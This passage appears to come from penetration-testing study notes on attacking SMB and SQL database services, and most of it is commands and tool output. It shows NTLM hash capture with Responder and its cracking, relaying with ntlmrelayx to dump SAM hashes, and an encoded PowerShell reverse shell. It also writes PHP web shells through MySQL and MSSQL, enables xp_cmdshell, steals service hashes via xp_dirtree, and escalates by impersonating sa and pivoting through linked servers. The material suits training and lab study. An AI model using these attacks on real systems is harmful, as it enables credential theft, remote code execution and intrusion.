<code>\\\\mysharefoder\\</code> instead of <code>\\\\mysharedfolder\\</code>. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server.</p> <pre><code>secops@kali[/kali]$ sudo responder -I ens33\n\n                                         __               \n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|              \n\n           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n[+] Poisoners:                \n    LLMNR                      [ON]\n    NBT-NS                     [ON]        \n    DNS/MDNS                   [ON]   \n\n[+] Servers:         \n    HTTP server                [ON]                                   \n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]                                  \n    Auth proxy                 [OFF]\n    SMB server                 [ON]                                   \n    Kerberos server            [ON]                                   \n    SQL server                 [ON]                                   \n    FTP server                 [ON]                                   \n    IMAP server                [ON]                                   \n    POP3 server                [ON]                                   \n    SMTP server                [ON]                                   \n    DNS server                 [ON]                                   \n    LDAP server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]                                   \n\n[+] HTTP Options:                                                                  \n    Always serving EXE         [OFF]                                               \n    Serving EXE                [OFF]                                               \n    Serving HTML               [OFF]                                               \n    Upstream Proxy             [OFF]                                               \n\n[+] Poisoning Options:                                                             \n    Analyze Mode               [OFF]                                               \n    Force WPAD auth            [OFF]                                               \n    Force Basic Auth           [OFF]                                               \n    Force LM downgrade         [OFF]                                               \n    Fingerprint hosts          [OFF]                                               \n\n[+] Generic Options:                                                               \n    Responder NIC              [tun0]                                              \n    Responder IP               [10.10.14.198]                                      \n    Challenge set              [random]                                            \n    Don't Respond To Names     ['ISATAP']                                          \n\n[+] Current Session Variables:                                                     \n    Responder Machine Name     [WIN-2TY1Z1CIGXH]   \n    Responder Domain Name      [HF2L.LOCAL]                                        \n    Responder DCE-RPC Port     [48162] \n\n[+] Listening for events... \n\n[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)\n[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)\n[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local\n[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder\n[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local\n[SMB] NTLMv2-SSP Client   : 10.10.110.17\n[SMB] NTLMv2-SSP Username : WIN7BOX\\demouser\n[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000\n</code></pre> <p>All saved Hashes are located in Responder's logs directory (<code>/usr/share/responder/logs/</code>).</p> <pre><code>secops@kali[/kali]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n\nhashcat (v6.1.1) starting...\n\n&lt;SNIP&gt;\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344386\n* Bytes.....: 139921355\n* Keyspace..: 14344386\n\nADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: NetNTLMv2\nHash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000\nTime.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)\nTime.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 75776/14344386 (0.53%)\nRejected.........: 0/75776 (0.00%)\nRestore.Point....: 73728/14344386 (0.51%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: compu -&gt; kodiak1\n\nStarted: Mon Apr 11 16:49:34 2022\nStopped: Mon Apr 11 16:49:37 2022\n</code></pre> <p>If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using <code>impacket-ntlmrelayx</code>.</p> <p>Set SMB to <code>OFF</code> in our responder configuration file (<code>/etc/responder/Responder.conf</code>).</p> <pre><code>secops@kali[/kali]$ cat /etc/responder/Responder.conf | grep 'SMB ='\n\nSMB = Off\n</code></pre> <p>Then we execute <code>impacket-ntlmrelayx</code> with the option <code>--no-http-server</code>, <code>-smb2support</code>, and the target machine with the option <code>-t</code>. By default, <code>impacket-ntlmrelayx</code> will dump the SAM database, but we can execute commands by adding the option <code>-c</code>.</p> <pre><code>secops@kali[/kali]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n&lt;SNIP&gt;\n\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up WCF Server\n\n[*] Servers started, waiting for connections\n\n[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146\n[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED\n[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!\n[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!\n[*] Service RemoteRegistry is in stopped state\n[*] Service RemoteRegistry is disabled, enabling it\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::\ndemouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\ntest:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::\n[*] Done dumping SAM hashes for host: 10.10.110.146\n[*] Stopping service RemoteRegistry\n[*] Restoring the disabled state for service RemoteRegistry\n</code></pre> <p>We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).</p> <pre><code>secops@kali[/kali]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'\n</code></pre> <p>Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.</p> <pre><code>secops@kali[/kali]$ nc -lvnp 9001\n\nlistening on [any] 9001 ...\nconnect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471\n\nPS C:\\Windows\\system32&gt; whoami;hostname\n\nnt authority\\system\nWIN11BOX\n</code></pre> <p>RPC</p> <p>Apart from enumeration, we can use RPC to make changes to the system:</p> <ul> <li>Change a user's password.</li> <li>Create a new domain user.</li> <li>Create a new shared folder.</li> </ul>","title":"SMB"},{"location":"attacking_common_services/attacking_sql/","text":"Enumeration <p>By default, MSSQL uses port <code>TCP/1433</code>, and MySQL uses <code>TCP/3306</code>.</p> <pre><code>secops@kali[/kali]$ nmap -Pn -sV -sC -p1433 10.10.10.125\n\nHost discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST\nNmap scan report for 10.10.10.125\nHost is up (0.0099s latency).\n\nPORT     STATE SERVICE  VERSION\n1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM\n| ms-sql-ntlm-info: \n|   Target_Name: xyz\n|   NetBIOS_Domain_Name: xyz\n|   NetBIOS_Computer_Name: mssql-test\n|   DNS_Domain_Name: xyz.LOCAL\n|   DNS_Computer_Name: mssql-test.xyz.LOCAL\n|   DNS_Tree_Name: xyz.LOCAL\n|_  Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2021-08-26T01:04:36\n|_Not valid after:  2051-08-26T01:04:36\n|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.\n\nHost script results:\n|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s\n| ms-sql-info: \n|   10.10.10.125:1433: \n|     Version: \n|       name: Microsoft SQL Server 2017 RTM\n|       number: 14.00.1000.00\n|       Product: Microsoft SQL Server 2017\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n</code></pre> <p>MySQL - Connecting to the SQL Server</p> <pre><code>secops@kali[/kali]$ mysql -u julio -pPassword123 -h 10.129.20.13\n\nWelcome to the MariaDB monitor. Commands end with ; or \\g.\nYour MySQL connection id is 8\nServer version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMySQL [(none)]&gt;\n</code></pre> <p>Sqlcmd - Connecting to the SQL Server <pre><code>C:\\xyz&gt; sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30\n\n1&gt;\n</code></pre></p> <p>When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use <code>SERVERNAME\\\\accountname</code> or <code>.\\\\accountname</code>.</p> <pre><code>secops@kali[/kali]$ sqsh -S 10.129.203.7 -U .\\\\julio -P 'MyPassword!' -h\n\nsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray\nPortions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp\nThis is free software with ABSOLUTELY NO WARRANTY\nFor more information type '\\warranty'\n1&gt;\n</code></pre> <p><code>MySQL</code> default system schemas/databases:</p> <ul> <li> <code>mysql</code> - is the system database that contains tables that store information required by the MySQL server</li> <li> <code>information_schema</code> - provides access to database metadata</li> <li> <code>performance_schema</code> - is a feature for monitoring MySQL Server execution at a low level</li> <li> <code>sys</code> - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema</li> </ul> <p><code>MSSQL</code> default system schemas/databases:</p> <ul> <li> <code>master</code> - keeps the information for an instance of SQL Server.</li> <li> <code>msdb</code> - used by SQL Server Agent.</li> <li> <code>model</code> - a template database copied for each new database.</li> <li> <code>resource</code> - a read-only database that keeps system objects visible in every database on the server in sys schema.</li> <li> <code>tempdb</code> - keeps temporary objects for SQL queries.</li> </ul> <p>SQL Syntax <pre><code>mysql&gt; SHOW DATABASES;\n\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| xyzusers           |\n+--------------------+\n2 rows in set (0.00 sec)\n</code></pre></p> <p>If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax. <pre><code>1&gt; SELECT name FROM master.dbo.sysdatabases\n2&gt; GO\n\nname\n--------------------------------------------------\nmaster\ntempdb\nmodel\nmsdb\nxyzusers\n</code></pre></p> <pre><code>mysql&gt; USE xyzusers;\n\nDatabase changed\n</code></pre> <pre><code>1&gt; USE xyzusers\n2&gt; GO\n\nChanged database context to 'xyzusers'.\n</code></pre> <pre><code>mysql&gt; SHOW TABLES;\n\n+----------------------------+\n| Tables_in_xyzusers         |\n+----------------------------+\n| actions                    |\n| permissions                |\n| permissions_roles          |\n| permissions_users          |\n| roles                      |\n| roles_users                |\n| settings                   |\n| users                      |\n+----------------------------+\n8 rows in set (0.00 sec)\n</code></pre> <pre><code>1&gt; SELECT table_name FROM xyzusers.INFORMATION_SCHEMA.TABLES\n2&gt; GO\n\ntable_name\n--------------------------------\nactions\npermissions\npermissions_roles\npermissions_users\nroles      \nroles_users\nsettings\nusers \n(8 rows affected)\n</code></pre> <pre><code>mysql&gt; SELECT * FROM users;\n\n+----+---------------+------------+---------------------+\n| id | username      | password   | date_of_joining     |\n+----+---------------+------------+---------------------+\n|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |\n|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |\n|  3 | john          | john123!   | 2020-07-02 11:47:16 |\n|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |\n+----+---------------+------------+---------------------+\n4 rows in set (0.00 sec)\n</code></pre> <pre><code>1&gt; SELECT * FROM users\n2&gt; go\n\nid          username             password         data_of_joining\n----------- -------------------- ---------------- -----------------------\n          1 admin                p@ssw0rd         2020-07-02 00:00:00.000\n          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000\n          3 john                 john123!         2020-07-02 11:47:16.000\n          4 tom                  tom123!          2020-07-02 12:23:16.000\n\n(4 rows affected)\n</code></pre>  Execute Commands <p><code>MSSQL</code> has a extended stored procedures called xp_cmdshell which allow us to execute system commands using SQL.</p> <p>XP_CMDSHELL <pre><code>1&gt; xp_cmdshell 'whoami'\n2&gt; GO\n\noutput\n-----------------------------\nno service\\mssql$sqlexpress\nNULL\n(2 rows affected)\n</code></pre></p> <p>If <code>xp_cmdshell</code> is not enabled, we can enable it, if we have the appropriate privileges, using the following command: <pre><code>-- To allow advanced options to be changed.  \nEXECUTE sp_configure 'show advanced options', 1\nGO\n\n-- To update the currently configured value for advanced options.  \nRECONFIGURE\nGO  \n\n-- To enable the feature.  \nEXECUTE sp_configure 'xp_cmdshell', 1\nGO  \n\n-- To update the currently configured value for this feature.  \nRECONFIGURE\nGO\n</code></pre></p> <p>There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts.</p>  Write Local Files <p><code>MySQL</code> does not have a stored procedure like <code>xp_cmdshell</code>, but we can archive command execution if we write to a location in the file system that can execute our commands. For example, suppose <code>MySQL</code> operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. Then we can browse to the location where the file is and execute our commands.</p> <pre><code>mysql&gt; SELECT \"&lt;?php echo shell_exec($_GET['c']);?&gt;\" INTO OUTFILE '/var/www/html/webshell.php';\n\nQuery OK, 1 row affected (0.001 sec)\n</code></pre> <p>In <code>MySQL</code>, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the <code>LOAD DATA</code> and <code>SELECT \u2026 INTO OUTFILE</code> statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.</p> <p>Here we can see the <code>secure_file_priv</code> variable is empty, which means we can read and write data using <code>MySQL</code>:</p> <pre><code>mysql&gt; show variables like \"secure_file_priv\";\n\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv |       |\n+------------------+-------+\n\n1 row in set (0.005 sec)\n</code></pre> <p>To write files using <code>MSSQL</code>, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p> <pre><code>1&gt; sp_configure 'show advanced options', 1\n2&gt; GO\n3&gt; RECONFIGURE\n4&gt; GO\n5&gt; sp_configure 'Ole Automation Procedures', 1\n6&gt; GO\n7&gt; RECONFIGURE\n8&gt; GO\n</code></pre> <pre><code>1&gt; DECLARE @OLE INT\n2&gt; DECLARE @FileID INT\n3&gt; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\n4&gt; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1\n5&gt; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET[\"c\"]);?&gt;'\n6&gt; EXECUTE sp_OADestroy @FileID\n7&gt; EXECUTE sp_OADestroy @OLE\n8&gt; GO\n</code></pre>  Read Local Files <p>By default, <code>MSSQL</code> allows file read on any file in the operating system to which the account has read access. </p> <pre><code>1&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n2&gt; GO\n\nBulkColumn\n\n-----------------------------------------------------------------------------\n# Copyright (c) 1993-2009 Microsoft Corp.\n#\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n#\n# This file contains the mappings of IP addresses to hostnames. Each\n# entry should be kept on an individual line. The IP address should\n\n(1 rows affected)\n</code></pre> <p>By default a <code>MySQL</code> installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges:</p> <pre><code>mysql&gt; select LOAD_FILE(\"/etc/passwd\");\n\n+--------------------------+\n| LOAD_FILE(\"/etc/passwd\")\n+--------------------------------------------------+\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n\n&lt;SNIP&gt;\n</code></pre>  Capture MSSQL Service Hash <p>We can also steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p> <p>To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:</p> <p>XP_DIRTREE Hash Stealing <pre><code>1&gt; EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'\n2&gt; GO\n\nsubdirectory    depth\n--------------- -----------\n</code></pre></p> <p>XP_SUBDIRS Hash Stealing <pre><code>1&gt; EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'\n2&gt; GO\n\nHResult 0x55F6, Level 16, State 1\nxp_subdirs could not access '\\\\10.10.110.17\\share\\*.*': FindFirstFile() returned error 5, 'Access is denied.'\n</code></pre></p> <p>If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.</p> <p>XP_SUBDIRS Hash Stealing with Responder <pre><code>secops@kali[/kali]$ sudo responder -I tun0\n\n                                         __               \n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|              \n&lt;SNIP&gt;\n\n[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.10.110.17\n[SMB] NTLMv2-SSP Username : SRVMSSQL\\demouser\n[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000\n</code></pre></p> <p>XP_SUBDIRS Hash Stealing with impacket <pre><code>secops@kali[/kali]$ sudo impacket-smbserver share ./ -smb2support\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 \n[*] Config file parsed                                                 \n[*] Config file parsed                                                 \n[*] Config file parsed\n[*] Incoming connection (10.129.203.7,49728)\n[*] AUTHENTICATE_MESSAGE (WINSRV02\\mssqlsvc,WINSRV02)\n[*] User WINSRV02\\mssqlsvc authenticated successfully                        \n[*] demouser::WIN7BOX:5e3ab1c4380b94an[*] Closing down connection (10.129.203.7,49728)                      \n[*] Remaining connections []\n</code></pre></p>  Impersonate Existing Users with MSSQL <p>SQL Server has a special permission, named <code>IMPERSONATE</code>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.</p> <p>First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.</p> <p>Identify Users that We Can Impersonate <pre><code>1&gt; SELECT distinct b.name\n2&gt; FROM sys.server_permissions a\n3&gt; INNER JOIN sys.server_principals b\n4&gt; ON a.grantor_principal_id = b.principal_id\n5&gt; WHERE a.permission_name = 'IMPERSONATE'\n6&gt; GO\n\nname\n-----------------------------------------------\nsa\nben\nvalentin\n\n(3 rows affected)\n</code></pre></p> <p>To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role: <pre><code>1&gt; SELECT SYSTEM_USER\n2&gt; SELECT IS_SRVROLEMEMBER('sysadmin')\n3&gt; go\n\n-----------\njulio                                                                                                                    \n\n(1 rows affected)\n\n-----------\n          0\n\n(1 rows affected)\n</code></pre></p> <p>As the returned value <code>0</code> indicates, we do not have the sysadmin role, but we can impersonate the <code>sa</code> user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement <code>EXECUTE AS LOGIN</code> and set it to the user we want to impersonate.</p> <pre><code>1&gt; EXECUTE AS LOGIN = 'sa'\n2&gt; SELECT SYSTEM_USER\n3&gt; SELECT IS_SRVROLEMEMBER('sysadmin')\n4&gt; GO\n\n-----------\nsa\n\n(1 rows affected)\n\n-----------\n          1\n\n(1 rows affected)\n</code></pre>  <p>Note: It's recommended to run <code>EXECUTE AS LOGIN</code> within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using <code>USE master</code>.</p>  <p>We can now execute any command as a sysadmin as the returned value <code>1</code> indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement <code>REVERT</code>.</p>  <p>Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.</p>   Communicate with Other Databases with MSSQL <p><code>MSSQL</code> has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.</p> <p>If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.</p> <p>Identify linked Servers in MSSQL <pre><code>1&gt; SELECT srvname, isremote FROM sysservers\n2&gt; GO\n\nsrvname                             isremote\n----------------------------------- --------\nDESKTOP-MFERMN4\\SQLEXPRESS          1\n10.0.0.12\\SQLEXPRESS                0\n\n(2 rows affected)\n</code></pre></p> <p>As we can see in the query's output, we have the name of the server and the column <code>isremote</code>, where <code>1</code> means is a remote server, and <code>0</code> is a linked server.</p> <p>Next, we can attempt to identify the user used for the connection and its privileges. <pre><code>1&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]\n2&gt; GO\n\n------------------------------ ------------------------------ ------------------------------ -----------\nDESKTOP-0L9D4KA\\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1\n\n(1 rows affected)\n</code></pre></p>  <p>Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).</p>  <p>We can now execute queries with sysadmin privileges on the linked server. As <code>sysadmin</code>, we control the SQL Server instance. We can read data from any database or execute system commands with <code>xp_cmdshell</code>.</p>","title":"SQL Databases"},{"location":"attacking_common_services/interacting/","text":"Server Message Block (SMB) <p>Windows CMD - Net Use <pre><code>C:\\xyz&gt; net use n: \\\\192.168.220.129\\Finance\n\nThe command completed successfully.\n</code></pre></p> <pre><code>C:\\xyz&gt; net use n: \\\\192.168.220.129\\Finance /user:plaintext Password123\n\nThe command completed successfully.\n</code></pre> <p>With the shared folder mapped as the n drive, we can execute Windows commands as if this shared folder is on our local computer.</p> <pre><code>C:\\xyz&gt; dir n: /a-d /s /b | find /c \":\\\"\n\n29302\n</code></pre>    Syntax Description     <code>dir</code> Application   <code>n:</code> Directory or drive to search   <code>/a-d</code> <code>/a</code> is the attribute and <code>-d</code> means not directories   <code>/s</code> Displays files in a specified directory and all subdirectories   <code>/b</code> Uses bare format (no heading information or summary)    <p>The following command <code>| find /c \":\\\\\"</code> process the output of <code>dir n: /a-d /s /b</code> to count how many files exits in the directory and subdirectories. You can use <code>dir /?</code> to see the full help. Searching througth 29,302 files is time comsuming, scripting and command line utilities can help us speed up the search.</p> <pre><code>C:\\xyz&gt;dir n:\\*cred* /s /b\n\nn:\\Contracts\\private\\credentials.txt\n\n\nC:\\xyz&gt;dir n:\\*secret* /s /b\n\nn:\\Contracts\\private\\secret.txt\n</code></pre> <p>Windows CMD - Findstr <pre><code>c:\\xyz&gt;findstr /s /i cred n:\\*.*\n\nn:\\Contracts\\private\\secret.txt:file with all credentials\nn:\\Contracts\\private\\credentials.txt:admin:SecureCredentials!\n</code></pre></p> <p>Windows PowerShell <pre><code>PS C:\\xyz&gt; Get-ChildItem \\\\192.168.220.129\\Finance\\\n\n    Directory: \\\\192.168.220.129\\Finance\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         2/23/2022   3:27 PM                Contracts\n</code></pre></p> <p>Instead of <code>net use</code>, we can use <code>New-PSDrive</code> in PowerShell.</p> <p>To provide a username and password with Powershell, we need to create a PSCredential object.</p> <pre><code>PS C:\\xyz&gt; $username = 'plaintext'\nPS C:\\xyz&gt; $password = 'Password123'\nPS C:\\xyz&gt; $secpassword = ConvertTo-SecureString $password -AsPlainText -Force\nPS C:\\xyz&gt; $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword\nPS C:\\xyz&gt; New-PSDrive -Name \"N\" -Root \"\\\\192.168.220.129\\Finance\" -PSProvider \"FileSystem\" -Credential $cred\n\nName           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation\n----           ---------     --------- --------      ----                                                              ---------------\nN                                      FileSystem    \\\\192.168.220.129\\Finance\n</code></pre> <p>In PowerShell, we can use the command <code>Get-ChildItem</code> or the short variant <code>gci</code> instead of the 